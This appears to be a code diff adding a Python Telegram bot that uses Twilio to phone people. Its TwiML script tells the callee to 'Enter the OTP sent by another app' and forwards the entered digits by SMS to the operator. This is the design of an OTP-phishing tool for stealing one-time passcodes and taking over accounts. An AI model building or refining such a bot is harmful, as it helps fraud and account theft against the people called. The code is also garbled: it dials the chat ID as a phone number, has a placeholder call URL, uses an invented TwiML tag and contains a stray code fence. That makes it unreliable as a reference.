@@ -1,0 +1,46 @@
+import os
+from telegram.ext import Updater, CommandHandler, MessageHandler
+from twilio.rest import Client
+
+# Telegram bot token
+TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
+
+# Twilio account credentials
+TWILIO_ACCOUNT_SID = 'YOUR_TWILIO_ACCOUNT_SID'
+TWILIO_AUTH_TOKEN = 'YOUR_TWILIO_AUTH_TOKEN'
+TWILIO_PHONE_NUMBER = 'YOUR_TWILIO_PHONE_NUMBER'
+
+# Create a Twilio client
+twilio_client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)
+
+# Define a function to send voice call
+def send_voice_call(update, context):
+    phone_number = update.message.chat_id
+    # Make a voice call using Twilio
+    call = twilio_client.calls.create(
+        from_=TWILIO_PHONE_NUMBER,
+        to=phone_number,
+        url='(link unavailable)'
+    )
+    context.bot.send_message(chat_id=update.message.chat_id, text='Voice call sent!')
+
+# Set up the Telegram bot
+updater = Updater(TOKEN, use_context=True)
+dp = updater.dispatcher
+dp.add_handler(CommandHandler('start', send_voice_call))
+updater.start_polling()
+```
+
+_Twilio TwiML_
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+    <Say>Enter the OTP sent by another app</Say>
+    <Gather action="" method="POST">
+        <Say>Enter the OTP</Say>
+    </Gather>
+    <Twilio_sms to="YOUR_TELEGRAM_BOT_PHONE_NUMBER">
+        {{GatheredDigits}}
+    </Twilio_sms>
+</Response>
+```
